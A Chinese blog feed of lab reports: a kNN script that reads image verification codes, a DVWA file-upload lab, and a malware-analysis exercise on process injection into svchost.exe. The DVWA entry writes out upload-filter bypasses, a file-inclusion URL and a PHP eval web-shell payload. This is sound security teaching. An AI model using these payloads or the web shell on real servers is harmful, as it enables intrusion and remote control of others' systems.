class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●kNN v1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">作者：Kadoya</span></span><br><span class="line"><span class="string">创建日期：19.5.21</span></span><br><span class="line"><span class="string">最近修改时间：19.5.21</span></span><br><span class="line"><span class="string">程序目的：k-最近邻</span></span><br><span class="line"><span class="string">主要算法说明：</span></span><br><span class="line"><span class="string">        1.分别计算测试数据距离每个已分类数据的欧几里得距离</span></span><br><span class="line"><span class="string">        2.选出k个距离最小的对象，这些对象中出现次数最多的类即为该测试数据的所属类</span></span><br><span class="line"><span class="string">程序备注：</span></span><br><span class="line"><span class="string">        1.我爱摸鱼摸鱼爱我（？</span></span><br><span class="line"><span class="string">        2.魔改了一下，建议的kNN输入数据包括如下内容：</span></span><br><span class="line"><span class="string">              训练集D、测试对象z（属性值构成的向量）、类别标签集合L、数量k</span></span><br><span class="line"><span class="string">              也就是knn(D,z,L,k):return c，c属于L。</span></span><br><span class="line"><span class="string">          不过我这里的kNN是knn(D,z,k)，L已经包含在D里面了，准确地说是D[i][0]。</span></span><br><span class="line"><span class="string">更新历史：</span></span><br><span class="line"><span class="string">        5.21 v1.0</span></span><br><span class="line"><span class="string">            ①基本功能完成，小bug不计其数，智障操作不计其数</span></span><br><span class="line"><span class="string">Attribute Information:</span></span><br><span class="line"><span class="string">   1. 类别标签</span></span><br><span class="line"><span class="string">   2-33. 属性值</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> splitPIC <span class="keyword">import</span> get_feature</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment">#import os</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stardust</span><span class="params">(data)</span>:</span><span class="comment">#基本处理  参数：原始数据</span></span><br><span class="line">    lost_star=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        lost_star.append(i.strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>))</span><br><span class="line">    lost_star=[[i[<span class="number">0</span>]]+list(map(float,i[<span class="number">1</span>:])) <span class="keyword">for</span> i <span class="keyword">in</span> lost_star[:]]<span class="comment">#str转为float</span></span><br><span class="line">    <span class="keyword">return</span> lost_star</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">knn</span><span class="params">(test_data,train_data,k)</span>:</span><span class="comment">#参数：测试数据，已分类好的数据集，k值</span></span><br><span class="line">    d=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> range(len(train_data)):<span class="comment">#遍历数据集</span></span><br><span class="line">        t=sum([pow(test_data[i]-train_data[s][i+<span class="number">1</span>],<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(train_data[s])<span class="number">-1</span>)])<span class="comment">#计算欧几里得距离</span></span><br><span class="line">        d[s]=t  <span class="comment">#key:value=图像所在行数:测试图距该图距离</span></span><br><span class="line">    s=sorted(d.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>])[:k]<span class="comment">#从小到大排序</span></span><br><span class="line">    last=[train_data[i[<span class="number">0</span>]][<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> s]<span class="comment">#挑选前k个最近的点</span></span><br><span class="line">    p=Counter(last).most_common(<span class="number">1</span>)<span class="comment">#出现最多次的类即为测试数据的归属类</span></span><br><span class="line">    <span class="keyword">return</span> p[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:   </span><br><span class="line">    path = <span class="string">r'data.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    dataSet=stardust(data)</span><br><span class="line"></span><br><span class="line">    img=Image.open(<span class="string">'testnew.gif'</span>)</span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    img=img.convert(<span class="string">'L'</span>).convert(<span class="string">'1'</span>)</span><br><span class="line">    boxs = [(<span class="number">5</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">21</span>), (<span class="number">17</span>, <span class="number">1</span>, <span class="number">29</span>, <span class="number">21</span>), (<span class="number">29</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">21</span>), (<span class="number">41</span>, <span class="number">1</span>, <span class="number">53</span>, <span class="number">21</span>)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(boxs)):</span><br><span class="line">        roi = img.crop(boxs[x])</span><br><span class="line">        result+=knn(get_feature(roi),dataSet,<span class="number">10</span>)</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">##    #测试正确率</span></span><br><span class="line"><span class="comment">##    path='./origin/'</span></span><br><span class="line"><span class="comment">##    filelist=[path+i for i in os.listdir(path)]</span></span><br><span class="line"><span class="comment">##    error=0</span></span><br><span class="line"><span class="comment">##    for i in filelist:</span></span><br><span class="line"><span class="comment">##        img=Image.open(i)</span></span><br><span class="line"><span class="comment">##        result=''</span></span><br><span class="line"><span class="comment">##        img=img.convert('L').convert('1')</span></span><br><span class="line"><span class="comment">##        boxs = [(5, 1, 17, 21), (17, 1, 29, 21), (29, 1, 41, 21), (41, 1, 53, 21)]</span></span><br><span class="line"><span class="comment">##        for x in range(len(boxs)):</span></span><br><span class="line"><span class="comment">##            roi = img.crop(boxs[x])</span></span><br><span class="line"><span class="comment">##            result+=knn(get_feature(roi),dataSet,10)</span></span><br><span class="line"><span class="comment">##        print('========')</span></span><br><span class="line"><span class="comment">##        print(result)</span></span><br><span class="line"><span class="comment">##        if result!=i[len(path):-4]:</span></span><br><span class="line"><span class="comment">##            error+=1</span></span><br><span class="line"><span class="comment">##            print('wrong, correct answer is',i[len(path):-4])</span></span><br><span class="line"><span class="comment">##        print('========')</span></span><br><span class="line"><span class="comment">##    print(error/len(filelist))</span></span><br></pre></td></tr></table></figure><p>正确率在50左右，不出意料的低（。手动粗糙地指定rgb二值化了一下升到了60%，将训练集增加到200个后正确率提升至80%，但是kNN的话80+应该是极限了，也没有继续下去的必要。</p><p>姑且就这样了，没什么需要特别注意的点……可能暑假不想复习的时候会把剩下的弄完叭（</p></the>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA文件上传</title>
      <link href="/2019/05/11/DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2019/05/11/DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>堆一下实验报告<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文></the></p><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>文件上传漏洞指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。<br>防范漏洞的方法可分为两种：<br>1）客户端检测<br>客户端使用Javascript检测，在文件未上传时就对文件进行验证。<br>2）服务器端检测<br>在服务器端通过脚本进行检测，如文件扩展名是否合法、或黑白名单等。</p><h3 id="常见攻击方法"><a href="#常见攻击方法" class="headerlink" title="常见攻击方法"></a>常见攻击方法</h3><p><strong>1. 客户端检测后缀</strong><br>​    思路：F12修改前台代码或使用burpsuite修改上传后缀<br><strong>2.服务端MIME类型检测</strong>（Content-Type）<br>思路：修改文件名，修改Content-Type<br><strong>3.服务端目录路径检测(服务端检测后缀)</strong><br>思路：利用处理特性，如使用%00截断<br><strong>4.服务端文件扩展名检测</strong><br> 黑名单检测<br>（1）文件名大小写绕过<br>（2）特殊文件名绕过（test.asp. 或test.asp_，windows内. _默认为空格）<br>（3）%00截断绕过（test.asp%00.jpg ）<br>（4）.htaccess文件攻击（上传自定义htaccess）<br>白名单检测需与其他漏洞结合利用，如文件包含<br><strong>5.服务端文件内容检测</strong><br>文件相关信息检测：与其他攻击方法结合利用，如.htaccess文件攻击<br><strong>6.解析攻击</strong><br>apache2.2.8之前的版本存在解析漏洞，若文件名为s1.s2.s3  首先解析s3，如果无法解析再解析s2，所以可以构建文件为up.php.qwe<br>IIS6.0版本如果在目录名中含有.asp字符串，就按照asp去解析。如果文件名含有”.asp;”那么就会优先按照asp解析；7.0/7.5版本在url后面追加字符串“/任意文件名.php”就会按照php方式解析</p><h3 id="应对方法"><a href="#应对方法" class="headerlink" title="应对方法"></a>应对方法</h3><p>避免文件上传功能带来的安全问题：<br>（1）文件上传的目录设置为不可执行；<br>（2）用白名单机制判断文件类型（文件后缀、文件头）；<br>（3）对上传的文件做更改文件名、压缩、格式化等预处理；<br>（4）单独设置文件服务器的域名。</p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123; </span><br><span class="line">        <span class="comment">// No </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Yes! </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到未做任何防护，直接上传即可。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-a81e78efb762aff1.png" alt></p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File information </span></span><br><span class="line">$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">$uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line"><span class="comment">// Is it an image? </span></span><br><span class="line"><span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp; </span><br><span class="line">    ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br></pre></td></tr></table></figure></p><p>可以看到在服务器端检测了MIME类型。因此，思路如下：</p><ol><li>更改文件content-type</li><li>更改文件后缀名</li></ol><h4 id="更改文件content-type"><a href="#更改文件content-type" class="headerlink" title="更改文件content-type"></a>更改文件content-type</h4><p>将content-type更改为image，举例如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-923ed30ccc1ff1ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到成功上传了文件。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-7d33032fc376b5f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="更改文件后缀名"><a href="#更改文件后缀名" class="headerlink" title="更改文件后缀名"></a>更改文件后缀名</h4><h5 id="抓包更改后缀"><a href="#抓包更改后缀" class="headerlink" title="抓包更改后缀"></a>抓包更改后缀</h5><p>更改文件后缀为jpg，设置代理并上传，抓包如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-a5badc69be1c292b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>将文件后缀改为php，点击Forward按钮</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-cbf6b441ab844d14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到成功上传了文件。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-46cb24ce46a42e87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断。可选方法举例如下：</p><ol><li>更改文件后缀为.php.jpg，设置代理并上传。抓包并将php.jpg中的字符“.”（十六进制0x2e）更改为00。</li><li>更改文件后缀为.php.jpg，设置代理并上传。抓包并在php.jpg中的字符“.”（十六进制0x2e）前右键选择insert byte，增加一个0x00字节。</li><li>更改文件后缀为.php%00.jpg，设置代理并上传。抓包并选中%00，右键url-decode。</li></ol><p>这里取第一种方法，如下图：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e8cda6e584e6c02e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>同样可以成功上传。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e8e701b1653c872f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File information </span></span><br><span class="line">$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">$uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"><span class="comment">// Is it an image? </span></span><br><span class="line"><span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">    ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">    getimagesize( $uploaded_tmp ) ) &#123;</span><br></pre></td></tr></table></figure></p><p>可以看到判断了文件后缀以及是否是图像文件。</p><blockquote><p>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。<br>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p></blockquote><p>制作图片木马：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-43848afcf611dadc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>成功上传</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-cb878ea28c8e3e29.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>利用dvwa-high级别的文件包含漏洞，payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.6.6/DVWA/vulnerabilities/fi/?page=file://c:\wamp\WWW\DVWA\hackable\uploads\1.png</span><br></pre></td></tr></table></figure></p><p>尝试代码执行，可以看到文件中的php代码被解析，成功显示了phpinfo。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-2164416dac6307a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>使用蚁剑连接，连不上（……）可能是因为实验环境是7.x版本的php，区别详见<a href="https://php.net/manual/zh/migration71.incompatible.php" target="_blank" rel="noopener">PHP-不向后兼容</a>。干脆通过代码执行写入php文件，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php eval(\$_POST[&apos;shell&apos;]);?&gt;&quot;);</span><br></pre></td></tr></table></figure></p><p>设置参数如下</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-b64eb048cbcdad85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>成功连接。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-207647de7395604a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战lab03-3</title>
      <link href="/2019/04/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab03_3/"/>
      <url>/2019/04/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab03_3/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>堆一下实验报告<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文></the></p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>完成lab03-03程序的动态分析，得出恶意程序的目的。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>WinXP x32虚拟机</p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="PEiD-amp-ResourceHacker"><a href="#PEiD-amp-ResourceHacker" class="headerlink" title="PEiD &amp; ResourceHacker"></a>PEiD &amp; ResourceHacker</h4><p>用PEiD打开，可以发现该程序没有加壳，且包含一个资源。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-42c2341b3530dd75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到，该程序导入了如下函数。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-99c6f9b7833ad243.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>其中需要注意的函数有：</p><ul><li>获取环境变量及文件相关操作<ul><li>GetEnvironmentStrings</li><li>GetSystemDictionaryA</li><li>ReadFile</li><li>CreateFileA</li><li>WriteFile</li></ul></li><li>进程、线程相关操作（并未全部列出）<ul><li>Sleep</li><li>ResumeThread</li><li>CreateProcessA</li><li>GetProcAddress</li><li>WriteProcessMemory</li></ul></li><li>读取二进制资源（并未全部列出）<ul><li>FindResourceA</li><li>LoadResource</li><li>SizeofResource </li></ul></li><li>获取当前正在活动的ANSI代码页标识符，并获取系统OEM页标识符以将一个字符串正确转编码为另一个字符串<ul><li>GetACP</li><li>GetCpInfo</li><li>GetOEMCP</li><li>LCMapStringA</li><li>MultiByteToWideChar</li><li>WideCharToMultiByte</li></ul></li><li>疑似反调试<ul><li>GetVersion</li><li>GetStartupInfoA</li></ul></li></ul><p>用ResourceHacker打开，可以看到包含的资源如下，导出留待后续分析。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e82d0b0ae65df895.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>查看字符串可以发现包含<code>\svchost.exe</code>等字样。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-330288d2cc7d0b7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>初步猜测该程序会通过注入svchost.exe运行，并将包含的资源写入进程内存；除此以外，该程序极有可能还会创建文件以记录当前代码页ANSI标识符及某些字符串。同时，该恶意程序可能做了反调试工作，防止在虚拟机中运行或在Ollydbg等动态调试软件中运行。</p><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><h5 id="Lab03-03"><a href="#Lab03-03" class="headerlink" title="Lab03-03"></a>Lab03-03</h5><p>用IDA打开该程序，F5反编译，摘取关键代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc &lt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    lpAddress = <span class="number">0</span>;</span><br><span class="line">    hModule = GetModuleHandleA(<span class="number">0</span>);</span><br><span class="line">    sub_40149D(aSvchost_exe, &amp;ApplicationName, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="comment">//通过注入svchost.exe运行</span></span><br><span class="line">    lpAddress = (LPVOID)sub_40132C(hModule);</span><br><span class="line">    <span class="comment">//读取二进制资源并寻址</span></span><br><span class="line">    <span class="keyword">if</span> ( lpAddress )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4010EA(&amp;ApplicationName, lpAddress);</span><br><span class="line">      <span class="comment">//从该特定地址写入进程内存</span></span><br><span class="line">      <span class="built_in">memset</span>(&amp;ApplicationName, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">      <span class="comment">//将&amp;ApplicationName指向的字符串的前0x400个字符全部初始化为0</span></span><br><span class="line">      VirtualFree(lpAddress, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">      <span class="comment">//释放</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  Sleep(<span class="number">0x3E8</span>u);</span><br><span class="line">  <span class="comment">//挂起1000毫秒</span></span><br></pre></td></tr></table></figure></p><p>可以看到证实了之前的部分猜测，该程序会通过注入svchost.exe运行，将svchost.exe进程内存修改为经函数变换后的资源，并在挂起一秒后退出。<br>此外，在lab03-03.exe里还有一个没有用到的函数sub_401037()，暂时猜测是废弃函数，也可能会通过hook调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sub_401037()</span></span><br><span class="line">  hFile = CreateFileA(lpFileName, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFile )</span><br><span class="line">  &#123;</span><br><span class="line">    dwSize = GetFileSize(hFile, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dwSize )</span><br><span class="line">    &#123;</span><br><span class="line">      lpBuffer = VirtualAlloc(<span class="number">0</span>, dwSize, <span class="number">0x1000</span>u, <span class="number">4u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( lpBuffer )</span><br><span class="line">      &#123;</span><br><span class="line">        NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">        ReadFile(hFile, lpBuffer, dwSize, &amp;NumberOfBytesRead, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( NumberOfBytesRead != dwSize )</span><br><span class="line">        &#123;</span><br><span class="line">          VirtualFree(lpBuffer, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">          lpBuffer = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hFile);</span><br></pre></td></tr></table></figure><h5 id="localization（程序包含的资源）"><a href="#localization（程序包含的资源）" class="headerlink" title="localization（程序包含的资源）"></a>localization（程序包含的资源）</h5><p>在lab03-03.exe中，与程序中资源相关的部分代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  lpAddress = (LPVOID)sub_40132C(hModule);</span><br><span class="line"><span class="comment">//sub_40132c()</span></span><br><span class="line">  dwSize = SizeofResource(hModule, hResInfo);</span><br><span class="line">  ...</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(v5, v6, dwSize);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)v5 != <span class="number">77</span> || *((_BYTE *)v5 + <span class="number">1</span>) != <span class="number">90</span> )</span><br><span class="line">      sub_401000(v5, dwSize, <span class="number">65</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//sub_401000()</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(i + a1) ^= a3;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>构造解密脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2</span></span><br><span class="line">f=open(<span class="string">'LOCALIZATION'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">a=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    a+=chr(ord(i)^<span class="number">65</span>)</span><br><span class="line">f=open(<span class="string">'LOCALIZATION2'</span>,<span class="string">'wb'</span>).write(a)</span><br></pre></td></tr></table></figure></p><p>可得解密后的文件，易知这是一个PE文件。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-da174d10a585c3ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 